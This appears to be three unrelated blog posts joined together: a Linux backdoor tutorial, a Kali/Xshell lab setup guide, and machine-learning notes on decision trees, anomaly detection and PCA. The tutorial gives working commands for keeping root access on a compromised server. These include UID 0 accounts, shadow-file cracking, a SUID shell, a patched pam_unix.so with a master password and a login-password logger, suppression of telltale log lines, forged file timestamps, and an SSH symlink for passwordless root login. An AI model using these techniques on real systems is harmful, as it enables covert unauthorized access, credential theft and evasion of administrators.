text: I wrote up the environment separately in Setting up the Linux lab. After gaining control of a server, an intruder may leave scripts, processes or links for continued access. These are called backdoors. This part covers several examples on Linux: Additional user accounts Password cracking A set-user-ID shell PAM backdoors SSH symlinks … # Add user accounts Prerequisite: You already have a shell and root privileges on the server. # Users with uid=0 can log in remotely You can add a superuser account using the following command: echo "username:x:0:0::/:/bin/sh" >> /etc/passwd Then, use the command passwd username to change the password of the superuser. # Trying the account Enter the command: (Added super user backdoor) Then log in to the backdoor account via SSH: As you can see, I already have root privileges: Principle: Add an account with ID 0 to the server (because the root ID is 0). We can open passwd using the command vim /etc/passwd , where all the mappings between usernames and IDs are stored. The first entry belongs to root. At the end of the file is the account I just added, backdoor . An administrator can disable remote SSH login for accounts with UID 0. Make sure you have a regular account first so you can still log in. Open the sshd_config file using vim /etc/ssh/sshd_config . Find PermitRootLogin and change it to no. Then restart the SSH service. At this point, attempting to remotely log in to the root account via xshell will be denied. If you encounter a situation where remote login for the uid=0 account is disabled, you can also add a regular user: echo "username:x:1000:1000::/:/bin/sh" >> /etc/passwd The principle is the same; as we can observe, the ID of a regular user we use is 1000. # Adding an account without interaction The different vulnerabilities exploited can lead to situations where attackers face no interactive functionality or no feedback. In this situation, the first two methods are difficult to use, so the following method is given first: The commands useradd username -u 0 -o -g root -G root and echo "password" | passwd --stdin username are used. If the server is based on Debian, meaning the --stdin command cannot be used, the second command should be echo username:password | chpasswd , or simply use \n followed by Enter (because passwd requires the password to be entered twice): echo "password\npassword" | passwd username First command: Use the useradd command to add a user. The -u option sets the user ID to 0 (root user), and -g and -G set the primary and supplementary groups to root. If remote root login is disabled, adjust the account parameters accordingly. Second command: Add password (Newly created users in Linux are locked and need to be set with a password using the passwd command before they can be used). However, this method of adding user accounts can be easily detected by administrators. # Cracking User Passwords If we obtain some users' passwords, we can naturally log in directly next time. Linux stores user information in the passwd file, but the passwd file can be read by all users. Therefore, if user passwords are also stored in passwd, it will lead to password leakage. Therefore, Linux stores password information separately in the shadow file. Only the root user has read permissions for the shadow file; other users have no permissions, thus ensuring password security. However, if you obtain the shadow file ( /etc/shadow ), you will see that the password inside looks like this: The image shown () is of course the hash value of the password; it won't let you see the plaintext of the password directly. However, for weak passwords, we can crack them using the John the Ripper weak password scanner (built into Kali Linux). The usage is as follows: Use the unshadow command to combine passwd and shadow to get test : unshadow /etc/passwd /etc/shadow > test Dictionary cracking: Using the built-in dictionary (usr/share/john/password.lst): Command john test Use your own dictionary: command john --wordlist=dictionary_path test # Place SUID Shell Prerequisite: Root access to the server has been obtained (get shell). SUID Shell is a shell that can run with the privileges of the shell owner. This backdoor essentially modifies the attributes (rwsr-xr-x) of the shell owned by root. # Commands Execute commands as root: cp /bin/bash .shell chmod u+s .shell What the two commands do: Copy /bin/bash to a file named .shell in the current directory. After changing the permissions of the .shell file to u+s, other users will have the permissions of the file owner (while the current user is root, meaning they have root privileges). The next time you log in to the server as a regular user, you can use the command /.shell to run this shell and thus gain root privileges. However, bash2 has implemented some protection measures for SUID shells, so if you use the above command to run a .shell, the shell's privileges can only be elevated to root if you are local (not connected remotely). If you are running it remotely, the original privileges will remain unchanged. In this situation, you need to use the command: /.shell -p , which will grant you root shell access remotely. # Lab procedure whoami returned root . # PAM Backdoor # Introduction to PAM: In Linux, certain programs require authentication of the user who started them before execution, such as the commonly used su command. However, in actual work, we often have to use different authentication mechanisms to authenticate the accounts and passwords of different programs, which results in a single host having multiple different authentication systems, which is obviously unreasonable. Therefore, the PAM mechanism was developed. PAM can be described as an API that allows administrators to freely choose the authentication method for a program. PAM uses configuration files located in the directory /etc/pam.d/ , which correspond to different authentication methods. The program calls the corresponding configuration file in the directory, thereby invoking the local authentication module ( /lib/security/ ). # How the backdoor works When we log in, we also use the PAM module to verify whether our password is correct. Therefore, we can find the traditional password verification module (pam_unix.so) of PAM in the source code, modify the verification logic of PAM, and achieve the effect of directly returning a correct verification result instead of checking the password in the shadow. Then compile a .so file containing the backdoor and replace the original module. # Lab procedure Use the script directly: https://github.com/litsand/shell/blob/master/pam.sh Manual Change # Download PAM source code First, confirm the PAM version: Debian: dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 CentOS: rpm -qa|grep pam Using my Kali Linux instance as an example, the command dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 outputs: 1.4.0-11 Go to http://www.linux-pam.org/library/ or the stable version release address on GitHub https://github.com/linux-pam/linux-pam/releases to download the source code for your version. Download: wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz Uncompress: tar -xvf Linux-PAM-1.4.0.tar.xz # Modify source code Effect 1: Adding a custom password: Modify the file /modules/pam_unix/pam_unix_auth.c in the extracted directory: Add the following line below line 173: if (strcmp(p,"password")==0) {return PAM_SUCCESS;} The code is very simple: when the input 'p' matches the "password" we set, it returns a successful verification result. Build the module: Ensure that the gcc compiler and flex library are installed. The compilation command is as follows: cd Linux-PAM-1.4.0 ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr make To prevent the modified .so file from being incorrect, first find the original file and make a backup: The command find / -name "pam_unix.so" (finds the original file address) The original file is located at: /usr/lib/x86_64-linux-gnu/security/pam_unix.so The compiled new file is located at: root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak (Backup file is located at /tmp/pam_unix.so.bak) cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so (Copy the new .so file, overwriting the original file) Try logging in with the password you set: (Note that an existing account is required to log in) ssh existing_username@192.168.158.128 Successfully logged in as root using the custom password hello: Shortcomings & Improvements: If you are an administrator, view the login logs: To view the last 10 log entries in real time, use tail -f -n 10 /var/log/auth.log (depending on the specific situation, the log may also be /var/log/secure). The first log entry is from logging in with the correct password via SSH, and the second log entry is from logging in with a custom password. As you can see, the second entry has one more line than the first: Verification failed report. This is because, on the line before we added the statement, we first used the _unix_verify_password function for verification: Therefore, we can find the location of the function _unix_verify_password, and insert the previous line of code before it verifies, thus avoiding password verification errors. Change the file path to Linux-PAM-1.4.0/modules/pam_unix/support.c, as shown in the image below: After recompiling and overwriting, log in remotely via SSH and check the logs: As you can see, the third login produced the same log entries as the first. If the administrator is viewing the file modification time: You can use the touch -r command to modify the time of a new file: touch pam_unix.so -r /tmp/pam_unix.so.bak (replace with the backup file's time) The results of using the stat pam_unix.so* command before and after the modification are shown below: (Only two items were changed, which may still be noticed by the administrator, but the -t option can be used to set the file's time recording.) Effect 2: Record passwords for users logging in via SSH: Similarly, modify the file /modules/pam_unix/pam_unix_auth.c in the extracted directory: Add the following line below line 173, as shown in the image below: Each time a user logs in, the username (name) and password (p) are saved in the file /tmp/.record_pwd. Save -> Compile -> Overwrite -> Log in to the account several times via SSH with the correct password, providing the recorded data -> View the saved file: cat /tmp/.record_pwd # SSH symbolic link backdoor Prerequisites: Getshell, root privileges have been obtained on the server. PAM authentication is enabled in the SSH configuration (to verify if PAM is enabled: cat /etc/ssh/sshd_config|grep UsePAM ). It is usually enabled by default. The firewall is off, or the port number being used is open. # Principle: Introduction to Symbolic Links: A symbolic link is a special type of file that points to another file location. Symbolic links exist as paths, similar to shortcuts in the Windows operating system. If PAM authentication is enabled in the SSH configuration, the PAM module will search for the relevant configuration file (usually located in /etc/pam.d/ ). The pam_rootok.so module is enabled in the /etc/pam.d/su file. This module allows the root user to authenticate directly without needing to enter a password. When the symbolic link file for the specified port is /path/su, if an SSH connection is made from that port, PAM will look for the corresponding configuration file in the path /etc/pam.d/ , i.e., /etc/pam.d/su . Then, using the pam_rootok.so module enabled in su, passwordless login is achieved. # Creating a root account Create an SSH symbolic link: ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=port_number (ensure the port number is valid) This command first uses ln (-f) to force the creation of a symbolic link (-s) to the file /usr/sbin/sshd , and saves it as /usr/local/su (the path is arbitrary, the filename can be changed). Then it links the su file (sshd) to the specified port. While the name of the created symbolic link can be changed, it cannot be named arbitrarily. Available names can be viewed using the command: find /etc/pam.d|xargs grep "pam_rootok" . # Test run Now you can log in as root from port 2333 ( ssh root@192.168.158.128 -p 2333 ): This demonstration uses cmd: # Creating other accounts PAM does not have a configuration file for passwordless login for other users beforehand. Therefore, you need to use the following command beforehand to save the content within the quotation marks to the file /etc/pam.d/username using echo , so that the configuration file with your username as the filename will use the pam_rootok.so module. echo " #%PAM-1.0 auth sufficient pam_rootok.so auth includes system-auth account includes system-auth Passwords include system-auth The session includes system-auth " >> /etc/pam.d/existing usernames". Now you can see a configuration file named after your username (here, kali) in the /etc/pam.d/ folder: Now, if you execute the command find /etc/pam.d|xargs grep "pam_rootok" again, you can see that kali has been added as a usable name: Now, by using the command: ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=port number to create a symbolic link, you can achieve the effect of passwordless login for ordinary users. title: Setting Up the Linux Backdoor Lab
text: I used a Kali Linux guest as the lab server and Xshell on a Windows host to connect over SSH. This was the setup for my Linux backdoor experiments. Here’s how I connected and what I checked when the first attempt failed. The screenshots are from my Kali 2022.1 installation in VMware on Windows in 2022. Menus, default service state and SSH settings vary between versions. The old image links identify the release in this post. # Create the Kali VM I used VMware. I’ll skip the wizard here. Alongside installing from an ISO, Kali offers preconfigured guests: Kali 2022.1 VMware image Kali 2022.1 VirtualBox image The official Kali download page lists images for a fresh installation. The rest of my notes assume a Kali guest. # Create an Xshell session The Xshell installer is available from NetSarang. Choose File → New and create an SSH session: Give the session a name, choose SSH and use port 22 unless you’ve changed the service port. Set the host to the guest’s IP address. Inside the guest, ip addr lists the interfaces. I used ifconfig for this screenshot; if it isn’t installed, ip addr works. My guest was at 192.168.158.128 . Use the address assigned to yours. The loopback address 127.0.0.1 would refer to the host when entered in Xshell. # Troubleshooting SSH My first connection failed: A stopped service, an unreachable guest and a rejected login need different checks. # Is the service running? Check the SSH service inside Kali and start it if needed: sudo systemctl status sshsudo systemctl start sshsudo systemctl status sshThe screenshot shows service ssh status . The important part is active (running) . To start the service automatically on boot: sudo systemctl enable sshUndo that setting with sudo systemctl disable ssh . You can reconnect after starting the service without restarting the VM. # Can the host reach the guest? Once the server was running, I tried pinging the guest’s IP from Windows: A failed ping can be an address, adapter or firewall issue. In my case the problem was VMnet8. In VMware’s Edit → Virtual Network Editor, choose Change Settings, select VMnet8 and enable the host virtual adapter’s connection to the network. If it’s already selected, clearing it, applying, then selecting and applying again re-establishes the host connection. That got me connected, although I had to repeat it after restarting the computer (￣_￣|||). I tried port forwarding too, but it didn’t solve this issue. The host can use its VMnet8 adapter to reach a guest on the same private network. Port forwarding is worth considering when an external machine needs to initiate a connection to a service behind NAT. See VMware’s network mode overview. Reconnecting the adapter was a workaround. I still needed to check the VMnet8 adapter, the two subnet configurations and firewall rules to find the persistent cause. # The SSH server rejects the password Once the guest was reachable, Xshell reported another error: I was trying to log in as root, and Xshell reported “The SSH server rejected your password. Please try again.” After checking the credentials, I looked at the account’s state and the server’s authentication policy in /etc/ssh/sshd_config . In this specific VM the screenshot shows PermitRootLogin yes . An ordinary user account doesn’t require that change. Leave other settings alone unless your setup needs them. The OpenSSH configuration manual explains each directive. After editing, validate the configuration before restarting the service: sudo /usr/sbin/sshd -tsudo systemctl restart sshOnce the syntax check passes, restart SSH. The VM itself doesn’t need to reboot. Reconnecting from Xshell finally worked:

title: Machine Learning Notes
text: # Decision trees A decision tree classifies an observation through a sequence of tests. Training derives those decision rules from the examples. Trees are fast to evaluate, and you can follow the tests to see which attributes mattered. Splitting on individual attributes can overlook relationships between them. An uneven class distribution can also affect performance. # Building a tree The central question is which attribute to test at each node. Entropy measures uncertainty in the class distribution. In a dataset DDD with ncn_cnc​ classes, let P(ci)P(c_i)P(ci​) be the proportion in class cic_ici​. Its entropy is Entropy(D)=−∑i=1ncP(ci)log⁡2P(ci)Entropy(D)=-\sum_{i=1}^{n_c}P(c_i)\log_2P(c_i)Entropy(D)=−∑i=1nc​​P(ci​)log2​P(ci​). A pure node contains observations from a single class. One way to describe how close a node is to that state is the fraction covered by its majority class. Choose a split. ID3 uses information gain, C4.5 uses gain ratio, and classification trees in CART use Gini impurity. Information gain is the reduction in entropy after splitting on attribute AAA: Gain(D,A)=Entropy(D)−∑v=1V∣Dv∣∣D∣Entropy(Dv)Gain(D,A)=Entropy(D)-\sum_{v=1}^V\frac{|D_v|}{|D|}Entropy(D_v)Gain(D,A)=Entropy(D)−∑v=1V​∣D∣∣Dv​∣​Entropy(Dv​). Here VVV counts distinct values and DvD_vDv​ is the subset with value vvv. The ratio ∣Dv∣/∣D∣|D_v|/|D|∣Dv​∣/∣D∣ weights each child by its size. Information gain tends to favour attributes with many values, which can lead to overfitting. Gain ratio divides it by the entropy of the split: Gainratio(D,A)=Gain(D,A)/HA(D)Gain_{ratio}(D,A)=Gain(D,A)/H_A(D)Gainratio​(D,A)=Gain(D,A)/HA​(D), where HA(D)=−∑v=1V∣Dv∣∣D∣log⁡2∣Dv∣∣D∣H_A(D)=-\sum_{v=1}^V\frac{|D_v|}{|D|}\log_2\frac{|D_v|}{|D|}HA​(D)=−∑v=1V​∣D∣∣Dv​∣​log2​∣D∣∣Dv​∣​. Gini impurity is the probability that two independent draws from the class distribution differ. With class proportions pip_ipi​, Gini(D)=1−∑i=1kpi2Gini(D)=1-\sum_{i=1}^k p_i^2Gini(D)=1−∑i=1k​pi2​. Partition the samples. The selected test assigns the observations to child nodes. Repeat recursively. At each child choose a new split until a stopping condition applies, for example a pure node, no remaining attributes, or a maximum depth. Assign leaves. Limits on leaf size, depth or purity can leave several classes in a leaf. Assign the most frequent class. In these notes, a tie is broken by choosing at random among the tied classes. Prune. Removing overly complex branches can improve generalisation. Methods include reduced-error pruning (REP), pessimistic-error pruning (PEP), error-based pruning (EBP), cost-complexity pruning (CCP) and minimum-error pruning (MEP). Predict. Follow the tests from the root to a leaf and return its class, or its numerical prediction for a regression tree. # ID3 Compute the information gain for each candidate attribute and choose the largest. Create branches for its possible values. If no further split is possible, label the leaf with the most frequent class among its samples. # C4.5 Split selection. A low split entropy can inflate gain ratio. The selection heuristic first keeps attributes with above-average information gain and then chooses the highest gain ratio among them. Continuous attributes. ID3 handles discrete attributes. C4.5 can also split a continuous attribute by finding a threshold. Sort the distinct observed values. With mmm values, there are m−1m-1m−1 midpoints between neighbours. Evaluate the information gain for each binary test (above the midpoint versus at or below it) and choose the best threshold. Missing values. Calculate gain among observations with known values and scale it by the proportion of observations with known values. If this attribute is used, distribute the weight of a sample with a missing value across children in proportion to the known samples in those branches. # CART CART builds binary trees for classification or regression. In the categorical classification example here, test whether attribute AAA equals value aaa. The test divides DDD into D1D_1D1​ and D2D_2D2​: samples with that value and all remaining samples. For each candidate split, weight each child’s Gini impurity by its share of the samples: ∣D1∣∣D∣Gini(D1)+∣D2∣∣D∣Gini(D2)\frac{|D_1|}{|D|}Gini(D_1)+\frac{|D_2|}{|D|}Gini(D_2)∣D∣∣D1​∣​Gini(D1​)+∣D∣∣D2​∣​Gini(D2​). Choose the split with the lowest weighted impurity. Every internal node has exactly two children. # Anomaly detection Anomaly detection looks for observations that don’t fit the expected pattern. One approach flags points with a low estimated probability density. For a continuous variable, p(x)p(x)p(x) describes density near xxx. The probability over an interval is ∫x1x2p(x)dx\int_{x_1}^{x_2}p(x)dx∫x1​x2​​p(x)dx, and the integral over the entire real line is 1. Gaussian distribution p(x)=1σ2πe−(x−μ)22σ2p(x)=\frac{1}{\sigma\sqrt{2\pi}}e^{-\frac{(x-\mu)^2}{2\sigma^2}} p(x)=σ2π​1​e−2σ2(x−μ)2​ The mean μ\muμ locates the centre. A larger standard deviation σ\sigmaσ spreads the distribution out. For mmm observations the estimates used here are μ=1m∑ix(i)\mu=\frac1m\sum_i x^{(i)}μ=m1​∑i​x(i) and σ2=1m∑i(x(i)−μ)2\sigma^2=\frac1m\sum_i(x^{(i)}-\mu)^2σ2=m1​∑i​(x(i)−μ)2. Gaussian anomaly detection For one-dimensional observations x1,…,xmx_1,\dots,x_mx1​,…,xm​, estimate the mean and standard deviation, calculate p(x)p(x)p(x), and flag xix_ixi​ when p(xi)<εp(x_i)<\varepsilonp(xi​)<ε. For mmm samples with nnn features, arrange the values by feature jjj and observation iii. Each row contains the mmm observations for one feature: [x1(1)⋯x1(m)⋮⋮xn(1)⋯xn(m)]\begin{bmatrix} x_1^{(1)} & \cdots & x_1^{(m)} \\ \vdots & & \vdots \\ x_n^{(1)} & \cdots & x_n^{(m)} \end{bmatrix} ​x1(1)​⋮xn(1)​​⋯⋯​x1(m)​⋮xn(m)​​​ Fit the Gaussian parameters separately for each feature: μj=1m∑i=1mxj(i),σj2=1m∑i=1m(xj(i)−μj)2.\mu_j=\frac1m\sum_{i=1}^m x_j^{(i)},\qquad \sigma_j^2=\frac1m\sum_{i=1}^m(x_j^{(i)}-\mu_j)^2. μj​=m1​i=1∑m​xj(i)​,σj2​=m1​i=1∑m​(xj(i)​−μj​)2. Under the independent-feature model, multiply the densities: p(x)=∏j=1np(xj)=∏j=1n1σj2πe−(xj−μj)22σj2.p(x)=\prod_{j=1}^n p(x_j)=\prod_{j=1}^n\frac{1}{\sigma_j\sqrt{2\pi}}e^{-\frac{(x_j-\mu_j)^2}{2\sigma_j^2}}. p(x)=j=1∏n​p(xj​)=j=1∏n​σj​2π​1​e−2σj2​(xj​−μj​)2​. Compare this joint density with the threshold ε\varepsilonε. # Principal component analysis PCA projects high-dimensional data into fewer dimensions. The first principal direction captures the most variance. Each subsequent direction captures as much of the remaining variance as possible while staying orthogonal to the directions already chosen. PCA does not use class labels. Preprocess the features. For standardisation, centre them at zero and scale to unit standard deviation. Find the eigenvectors of the covariance matrix and the variance along each direction. Choose the target dimension kkk based on the task or a desired fraction of explained variance. Project the observations onto the space spanned by the leading kkk eigenvectors. # Model optimisation checks These notes consolidate an earlier post on model optimisation. They’re questions to investigate; the experiment determines which changes help. # Data Data quality limits what the model can achieve. What does each feature mean? Removing irrelevant features can save computation and reduce overfitting. Do the features have very different scales? Normalisation or standardisation can balance their influence and speed up convergence. Are there outliers? Decide whether keeping or filtering them makes the model more robust. Are there enough examples? Consider increasing the sample. Does the collection method produce representative data? Are labels assigned consistently under the same rules? # Compare models Try different models on comparable data and compare their performance to find one that better suits the task. # Key parameters Try every combination of the key parameter values under consideration and compare the model’s performance.
